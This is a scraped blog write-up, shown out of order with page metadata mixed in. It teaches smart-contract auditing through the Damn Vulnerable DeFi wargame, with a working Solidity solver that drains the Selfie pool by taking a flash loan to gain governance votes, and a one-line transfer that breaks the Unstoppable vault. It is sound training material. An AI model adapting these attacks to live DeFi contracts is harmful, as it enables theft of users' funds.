&lt;p&gt;The important point here is that in the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/selfie/Selfie.t.sol#L32&#34;&gt;SelfieChallenge.setUp()&lt;/a&gt; function, the token used as the loanable asset for the &lt;code&gt;SelfiePool&lt;/code&gt; is the &lt;strong&gt;same&lt;/strong&gt; token, &lt;code&gt;DamnValuableVotes&lt;/code&gt;, that is also used as the governance voting token.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function setUp() public {
    // ....

    // Deploy token
    token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    governance = new SimpleGovernance(token);

    // Deploy pool
    pool = new SelfiePool(token, governance);

    // ....&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving-5&#34;&gt;&lt;a href=&#34;#Challenge-Solving-5&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;Since the token used for loans and the token used for voting are the same, borrowing a large amount of tokens via &lt;code&gt;SelfiePool.flashLoan()&lt;/code&gt; temporarily grants us &lt;strong&gt;the same amount of voting power&lt;/strong&gt;. While holding these borrowed tokens, we gain the ability to call &lt;code&gt;SimpleGovernance.queueAction()&lt;/code&gt;.  &lt;/p&gt;
&lt;p&gt;The &lt;code&gt;queueAction()&lt;/code&gt; function allows us to schedule a specific function call (an Action) into the governance queue. We can leverage this by scheduling a call to the &lt;code&gt;emergencyExit()&lt;/code&gt; function, which withdraws all funds from the &lt;code&gt;SelfiePool&lt;/code&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;// SimpleGovernance.queueAction
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }

    // ....

    actionId = _actionCounter;

    _actions[actionId] = GovernanceAction({
        target: target,
        value: value,
        proposedAt: uint64(block.timestamp),
        executedAt: 0,
        data: data
    });

    unchecked {
        _actionCounter++;
    }

    // ....
}

// SimpleGovernance.executeAction
function executeAction(uint256 actionId) external payable returns (bytes memory) {
	  // _canBeExecuted: requires 2 days delay after queueAction execute
    if (!_canBeExecuted(actionId)) {
        revert CannotExecute(actionId);
    }

    GovernanceAction storage actionToExecute = _actions[actionId];
    actionToExecute.executedAt = uint64(block.timestamp);

    emit ActionExecuted(actionId, msg.sender);

    return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
}

// SelfiePool.emergencyExit
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit EmergencyExit(receiver, amount);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;SimpleGovernance.executeAction()&lt;/code&gt; function is responsible for executing an action that has been queued. For security, it enforces a time delay by checking the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/selfie/SimpleGovernance.sol#L87&#34;&gt;SimpleGovernance._canBeExecuted()&lt;/a&gt; function. This requires that &lt;strong&gt;at least 2 days&lt;/strong&gt; ( = &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/selfie/SimpleGovernance.sol#L12&#34;&gt;ACTION_DELAY_IN_SECONDS&lt;/a&gt;) have passed since the &lt;code&gt;queueAction()&lt;/code&gt; call before the action can be executed.  &lt;/p&gt;
&lt;p&gt;In the testing environment, of course, we can bypass this by using the &lt;a href=&#34;https://getfoundry.sh/reference/cheatcodes/warp.html&#34;&gt;vm.warp()&lt;/a&gt; function to modify the &lt;code&gt;block.timestamp&lt;/code&gt; value.  &lt;/p&gt;
&lt;p&gt;Based on the analysis so far, the attack flow can be summarized as follows:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Call &lt;code&gt;SelfiePool.flashLoan()&lt;/code&gt; to borrow tokens without collateral and gain massive voting power.  &lt;/li&gt;
&lt;li&gt;From within the &lt;code&gt;onFlashLoan()&lt;/code&gt; callback, call &lt;code&gt;SimpleGovernance.queueAction()&lt;/code&gt; to insert a call to &lt;code&gt;SelfiePool.emergencyExit()&lt;/code&gt; into the &lt;code&gt;_actions&lt;/code&gt; array.  &lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;vm.warp()&lt;/code&gt; to advance the &lt;code&gt;block.timestamp&lt;/code&gt; by at least 2 days.  &lt;/li&gt;
&lt;li&gt;Call &lt;code&gt;SimpleGovernance.executeAction()&lt;/code&gt; to execute the queued action.  &lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;    function test_selfie() public checkSolvedByPlayer {
        SelfieSolver solver = new SelfieSolver(pool, governance, token, recovery);
        solver.solve();
        vm.warp(block.timestamp + 2 days);
        solver.execute();
    }
  
// ....

contract SelfieSolver is IERC3156FlashBorrower {
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    DamnValuableVotes public immutable token;
    address public immutable recovery;
    uint256 actionId;

    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableVotes _token,
        address _recovery
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function solve() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, &amp;quot;&amp;quot;);
    }

    function onFlashLoan(
        address initiator,
        address tokenAddr,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // delegate voting 
        token.delegate(address(this));

        bytes memory callData = abi.encodeCall(pool.emergencyExit, (recovery));
        actionId = governance.queueAction(address(pool), 0, callData);

        token.approve(address(pool), amount);

        return keccak256(&amp;quot;ERC3156FlashBorrower.onFlashLoan&amp;quot;);
    }

    function execute() external {
        governance.executeAction(actionId);
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;Next-To-Do&#34;&gt;&lt;a href=&#34;#Next-To-Do&#34; class=&#34;headerlink&#34; title=&#34;Next To Do&#34;&gt;&lt;/a&gt;Next To Do&lt;/h2&gt;&lt;p&gt;That&amp;#x2019;s it for PART 1!&lt;/p&gt;
&lt;p&gt;Challenges 6&amp;#x2013;12 will be covered in PART 2, and Challenges 13&amp;#x2013;18 will be addressed in PART 3. Writing this document wasn&amp;#x2019;t easy, as I&amp;#x2019;m still learning myself and had to rely on my limited knowledge. But in PART 2, I&amp;#x2019;ll do my best to dive deeper into each topic and provide more thorough explanations.  &lt;/p&gt;
&lt;p&gt;Thank you!&lt;/p&gt;
&lt;h2 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.damnvulnerabledefi.xyz/&#34;&gt;https://www.damnvulnerabledefi.xyz/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0&#34;&gt;https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.theredguild.org/releasing-damn-vulnerable-defi-v4/&#34;&gt;https://blog.theredguild.org/releasing-damn-vulnerable-defi-v4/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.openzeppelin.com/&#34;&gt;https://docs.openzeppelin.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://eips.ethereum.org/erc&#34;&gt;https://eips.ethereum.org/erc&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research] smart contracts auditing 101 for pwners - PART 1 (EN) - hackyboiz">
  <meta property="og:description" content="&lt;h2 id=&#34;Introduction&#34;&gt;&lt;a href=&#34;#Introduction&#34; class=&#34;headerlink&#34; title=&#34;Introduction&#34;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;Hello, I&amp;#x2019;m d4tura, newly joining hackyboiz!&lt;/p&gt;
&lt;p&gt;I started writing this research post while solving the &lt;a href=&#34;https://www.damnvulnerabledefi.xyz/&#34;&gt;Damn Vulnerable DeFi&lt;/a&gt; smart contracts wargame, with the goal of breaking down and understanding the concepts required to solve each challenge.  &lt;/p&gt;
&lt;p&gt;Originally, I have been doing zero-day research and exploit development for more &amp;#x201C;traditional&amp;#x201D; targets such as kernels, hypervisors, client-server protocols, and mobile platforms&amp;#x2014;both professionally and personally&amp;#x2014;for several years, and that&amp;#x2019;s still my main work today, haha.  &lt;/p&gt;
&lt;p&gt;However, I believe that by exploring new fields I haven&amp;#x2019;t touched before and exchanging ideas with others, there is always much to learn from one another. With that mindset, I decided to join the &lt;strong&gt;hackyboiz&lt;/strong&gt; team, and chose smart contracts auditing&amp;#x2014;something I had no prior experience with&amp;#x2014;as the subject of my writing.  &lt;/p&gt;
&lt;p&gt;This post is written so that people like me, who mainly deal with system hacking, can start smart contracts auditing with just basic blockchain knowledge. Therefore, instead of focusing on the exact solutions for specific challenges, I tried to explain the &lt;strong&gt;core concepts needed to solve them, in the simplest possible way, from a pwner&amp;#x2019;s perspective.&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;Also, while most of the challenges are written in Solidity, I intentionally skipped deep dives into the language itself. The focus here is not on specific bug patterns, but rather on the underlying concepts embedded in each challenge.  &lt;/p&gt;
&lt;p&gt;Lastly, for terms that are secondary or might disrupt the flow of the writing, I didn&amp;#x2019;t provide long explanations in the text itself. Instead, I&amp;#x2019;ve added &lt;strong&gt;hyperlinks&lt;/strong&gt; to other well-written documents or code references for further reading.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image1.png&#34; alt&gt;&lt;/p&gt;
&lt;h2 id=&#34;Introduction-to-Damn-Vulnerable-DeFi&#34;&gt;&lt;a href=&#34;#Introduction-to-Damn-Vulnerable-DeFi&#34; class=&#34;headerlink&#34; title=&#34;Introduction to Damn Vulnerable DeFi&#34;&gt;&lt;/a&gt;Introduction to Damn Vulnerable DeFi&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Damn Vulnerable DeFi&lt;/strong&gt; wargame was originally maintained by the &lt;a href=&#34;https://github.com/OpenZeppelin/damn-vulnerable-defi&#34;&gt;OpenZeppelin&lt;/a&gt; group and later taken over by The Red Guild, which currently maintains it up to &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0&#34;&gt;v4.1.0&lt;/a&gt;.  &lt;/p&gt;
&lt;p&gt;All challenge environments are defined in the path &lt;code&gt;damn-vulnerable-defi/test/[challenge name]/[challenge name].t.sol&lt;/code&gt;. For example, the &lt;code&gt;Unstoppable&lt;/code&gt; challenge environment can be found in the file &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/unstoppable/Unstoppable.t.sol&#34;&gt;test/unstoppable/Unstoppable.t.sol&lt;/a&gt;.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image2.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Each challenge environment is structured within a single contract and consists of the following functions and parameters:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;deployer&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The entity responsible for deploying each smart contract, essentially acting as the vendor.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;player&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The participant solving the challenge.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;setUp()&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The function that sets up the challenge environment. Analysis should begin by checking how the environment is initialized here.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;test_assertInitialState()&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A function that verifies whether the initial setup in &lt;code&gt;setUp()&lt;/code&gt; was correctly applied.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;test_challengeName()&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The function where the solution must be implemented after analyzing the challenge. The &lt;strong&gt;&lt;code&gt;player&lt;/code&gt; is only allowed to modify this function.&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;_isSolved()&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A function that determines whether the challenge has been solved. If this function runs and completes without issues, the challenge is considered solved.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most of the smart contract code targeted by each challenge can be found in the path &lt;code&gt;damn-vulnerable-defi/src/[challenge name]/&lt;/code&gt;. In the &lt;code&gt;setUp()&lt;/code&gt; function, an instance of the contract is created, and the initial environment is configured. The objective of the wargame is to analyze the vulnerabilities in this contract code and modify the &lt;code&gt;test_challengeName()&lt;/code&gt; function so that the &lt;code&gt;_isSolved()&lt;/code&gt; function passes.  &lt;/p&gt;
&lt;p&gt;Although the concept of a &lt;strong&gt;contract&lt;/strong&gt; may feel unfamiliar at first, I personally find it very similar to a &lt;strong&gt;class&lt;/strong&gt; in C++ or other object-oriented languages.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image3.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;As an example, let&amp;#x2019;s look at the &lt;code&gt;UnstoppableVault&lt;/code&gt; contract from the first challenge we&amp;#x2019;ll cover, &lt;strong&gt;Unstoppable&lt;/strong&gt;. Using functionalities from already implemented contracts such as &lt;code&gt;IERC3156FlashLender&lt;/code&gt;, &lt;code&gt;ReentrancyGuard&lt;/code&gt;, &lt;code&gt;Owned&lt;/code&gt;, &lt;code&gt;ERC4626&lt;/code&gt;, and &lt;code&gt;Pausable&lt;/code&gt; is essentially the same as inheriting from parent classes. In addition, the fact that member variables and functions must be marked with the &lt;code&gt;public&lt;/code&gt; keyword to be accessible externally, and that the &lt;code&gt;this&lt;/code&gt; keyword is used to reference the current instance, is practically identical to the concept of classes.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;/**
 * An ERC4626-compliant tokenized vault offering flashloans for a fee.
 * An owner can pause the contract and execute arbitrary changes.
 */
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626, Pausable {

		// == member variable
    uint256 public constant FEE_FACTOR = 0.05 ether;
    uint64 public constant GRACE_PERIOD = 30 days;

    uint64 public immutable end = uint64(block.timestamp) + GRACE_PERIOD;

    address public feeRecipient;

		// == member function
    constructor(ERC20 _token, address _owner, address _feeRecipient)
        ERC4626(_token, &amp;quot;Too Damn Valuable Token&amp;quot;, &amp;quot;tDVT&amp;quot;)
        Owned(_owner)
    {
        feeRecipient = _feeRecipient;
        emit FeeRecipientUpdated(_feeRecipient);
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function maxFlashLoan(address _token) public view nonReadReentrant returns (uint256) {
        if (address(asset) != _token) {
            return 0;
        }

        return totalAssets();
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lastly, most challenges involve a token called &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/DamnValuableToken.sol&#34;&gt;DamnValuableToken&lt;/a&gt;, which is based on &lt;a href=&#34;https://eips.ethereum.org/EIPS/eip-20&#34;&gt;ERC20&lt;/a&gt;. It&amp;#x2019;s useful to be familiar with the following commonly used ERC20 functions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC20-totalSupply--&#34;&gt;totalSupply()&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Returns the total amount of assets created in the given token instance.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-balanceOf-address-&#34;&gt;balanceOf(address account)&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Returns the total amount of tokens held by the given &lt;code&gt;account&lt;/code&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-balanceOf-address-&#34;&gt;transfer(address to, address value)&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Withdraws &lt;code&gt;value&lt;/code&gt; tokens from the caller&amp;#x2019;s account and sends them to &lt;code&gt;to&lt;/code&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-transferFrom-address-address-uint256-&#34;&gt;transferFrom(address from, address to, uint256 value)&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Withdraws &lt;code&gt;value&lt;/code&gt; tokens from the &lt;code&gt;from&lt;/code&gt; account and sends them to &lt;code&gt;to&lt;/code&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-approve-address-uint256-&#34;&gt;approve(address spender, uint256 value)&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Allows &lt;code&gt;spender&lt;/code&gt; to withdraw up to &lt;code&gt;value&lt;/code&gt; tokens from the caller&amp;#x2019;s account.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(Just FYI, &lt;a href=&#34;https://eips.ethereum.org/erc&#34;&gt;ERC&lt;/a&gt; stands for &lt;strong&gt;Ethereum Request for Comment&lt;/strong&gt;, essentially the smart contract version of &lt;a href=&#34;https://en.wikipedia.org/wiki/Request_for_Comments&#34;&gt;RFC&lt;/a&gt; documents used in traditional programming to define technical specifications.)  &lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;1-Unstoppable-total-balance-total-supply&#34;&gt;&lt;a href=&#34;#1-Unstoppable-total-balance-total-supply&#34; class=&#34;headerlink&#34; title=&#34;1. Unstoppable: total balance != total supply&#34;&gt;&lt;/a&gt;1. Unstoppable: total balance != total supply&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation&#34;&gt;&lt;a href=&#34;#Challenge-Explanation&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;In the case of the &lt;code&gt;Unstoppable&lt;/code&gt; challenge, the goal is to trigger a &lt;code&gt;revert&lt;/code&gt; statement inside the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/unstoppable/UnstoppableVault.sol#L78&#34;&gt;UnstoppableVault.flashLoan()&lt;/a&gt; function. There are a total of four &lt;code&gt;revert&lt;/code&gt; statements present.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;    function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
~~~~        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256(&amp;quot;IERC3156FlashBorrower.onFlashLoan&amp;quot;)
        ) {
            revert CallbackFailed();
        }
        // ....&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;revert InvalidAmount(0)&lt;/code&gt;, &lt;code&gt;revert UnsupportedCurrency()&lt;/code&gt;, and &lt;code&gt;revert CallbackFailed()&lt;/code&gt; statements are not parts of the challenge that the player can deliberately manipulate. Instead, they serve more as basic integrity checks (sanity checks) to ensure the function behaves correctly under normal conditions. Therefore, our real objective is to trigger the &lt;code&gt;revert InvalidBalance()&lt;/code&gt; statement.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;// UnstoppableVault.totalAssets
function totalAssets() public view override nonReadReentrant returns (uint256) {
    return asset.balanceOf(address(this));
}

// ERC4626.convertToShares
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.
    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;totalAssets()&lt;/code&gt; function returns the total amount of assets (balance) currently held by the &lt;code&gt;UnstoppableVault&lt;/code&gt; contract. The &lt;code&gt;convertToShares()&lt;/code&gt; function may look a bit more complex since it involves arithmetic operations, but in practice, it can be interpreted as follows.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;convertToShares(totalSupply) 
= (totalSupply * totalSupply) / totalAssets()&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here, &lt;code&gt;totalSupply&lt;/code&gt; refers to the total assets issued by the ERC20 token. It increases when tokens are minted (&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC4626-mint-uint256-address-&#34;&gt;mint&lt;/a&gt;) and decreases when they are burned (&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC20-_burn-address-uint256-&#34;&gt;burn&lt;/a&gt;).  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;	  // ERC20._mint
    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;
        
.....
		// ERC20._burn
    function _burn(address from, uint256 amount) internal virtual {
        // ....
        unchecked {
            totalSupply -= amount;
        }&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Looking at the initial setup (&lt;code&gt;setUp()&lt;/code&gt; function) of the challenge, an amount equal to &lt;code&gt;TOKEN_IN_VAULT&lt;/code&gt; is deposited into the &lt;code&gt;vault&lt;/code&gt;. During this process, the amount deposited in the &lt;code&gt;vault&lt;/code&gt; (&lt;code&gt;totalAssets&lt;/code&gt;) and the total supply of tokens issued (&lt;code&gt;totalSupply&lt;/code&gt;) both become equal to the value of &lt;code&gt;TOKEN_IN_VAULT&lt;/code&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;    // UnstoppableChallenge.setUp
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));
        
// ....

    // ERC4626._deposit
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal virtual {
        // If _asset is ERC-777, `transferFrom` can trigger a reentrancy BEFORE the transfer happens through the
        // `tokensToSend` hook. On the other hand, the `tokenReceived` hook, that is triggered after the transfer,
        // calls the vault, which is assumed not malicious.
        //
        // Conclusion: we need to do the transfer before we mint so that any reentrancy would happen before the
        // assets are transferred and before the shares are minted, which is a valid state.
        // slither-disable-next-line reentrancy-no-eth
        SafeERC20.safeTransferFrom(_asset, caller, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(caller, receiver, assets, shares);
    }&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving&#34;&gt;&lt;a href=&#34;#Challenge-Solving&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;At the start, both &lt;code&gt;totalSupply&lt;/code&gt; (the amount of tokens minted by the &lt;code&gt;token&lt;/code&gt;) and &lt;code&gt;totalAssets()&lt;/code&gt; (the amount deposited in the &lt;code&gt;vault&lt;/code&gt;) are equal to &lt;code&gt;TOKEN_IN_VAULT&lt;/code&gt;. Because of this, &lt;code&gt;convertToShares(totalSupply)&lt;/code&gt; returns &lt;code&gt;TOKEN_IN_VAULT&lt;/code&gt;, and &lt;code&gt;totalAssets()&lt;/code&gt; also returns &lt;code&gt;TOKEN_IN_VAULT&lt;/code&gt;, making them identical.  &lt;/p&gt;
&lt;p&gt;However, this condition is not guaranteed to always hold true. What happens if someone transfers tokens directly to the &lt;code&gt;vault&lt;/code&gt; address? In that case, the actual assets held by the &lt;code&gt;vault&lt;/code&gt; (&lt;code&gt;totalAssets&lt;/code&gt;) increase, but the total supply of tokens (&lt;code&gt;totalSupply&lt;/code&gt;) remains unchanged. This discrepancy causes the condition &lt;code&gt;convertToShares(totalSupply) != balanceBefore&lt;/code&gt; to become true.  &lt;/p&gt;
&lt;p&gt;Therefore, simply sending even a very small amount of tokens directly to the &lt;code&gt;vault&lt;/code&gt; contract address is enough to solve the challenge.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;2-Naive-Receiver-flash-loan-with-fixed-fee&#34;&gt;&lt;a href=&#34;#2-Naive-Receiver-flash-loan-with-fixed-fee&#34; class=&#34;headerlink&#34; title=&#34;2. Naive Receiver: flash loan with fixed fee&#34;&gt;&lt;/a&gt;2. Naive Receiver: flash loan with fixed fee&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation-1&#34;&gt;&lt;a href=&#34;#Challenge-Explanation-1&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;The objective of this challenge is to drain all the assets from both the &lt;code&gt;receiver&lt;/code&gt; and the &lt;code&gt;pool&lt;/code&gt;, and then transfer them to the &lt;code&gt;recovery&lt;/code&gt;, using no more than two transaction calls.  &lt;/p&gt;
&lt;p&gt;(&lt;strong&gt;Just FYI, in this context, the term &lt;/strong&gt;transaction** refers to invoking functions that are defined in other contracts.)  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function _isSolved() private view {
    // Player must have executed two or less transactions
    assertLe(vm.getNonce(player), 2);

    // The flashloan receiver contract has been emptied
    assertEq(weth.balanceOf(address(receiver)), 0, &amp;quot;Unexpected balance in receiver contract&amp;quot;);

    // Pool is empty too
    assertEq(weth.balanceOf(address(pool)), 0, &amp;quot;Unexpected balance in pool&amp;quot;);

    // All funds sent to recovery account
    assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, &amp;quot;Not enough WETH in recovery account&amp;quot;);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/NaiveReceiverPool.sol#L43&#34;&gt;pool.flashLoan()&lt;/a&gt; function, as its name suggests, provides an unsecured loan (flash loan) service to the &lt;code&gt;receiver&lt;/code&gt;, and charges a fixed fee of &lt;code&gt;FIXED_FEE&lt;/code&gt; (&lt;code&gt;1 ether&lt;/code&gt;) as compensation.  &lt;/p&gt;
&lt;p&gt;(Just FYI, &lt;code&gt;1e18&lt;/code&gt; = &lt;code&gt;1 ether&lt;/code&gt;)  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (token != address(weth)) revert UnsupportedCurrency();

    // Transfer WETH and handle control to receiver
    weth.transfer(address(receiver), amount);
    totalDeposits -= amount;

    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    uint256 amountWithFee = amount + FIXED_FEE;
    weth.transferFrom(address(receiver), address(this), amountWithFee);
    totalDeposits += amountWithFee;

    deposits[feeReceiver] += FIXED_FEE;

    return true;
}&lt;/code&gt;&lt;/pre&gt;
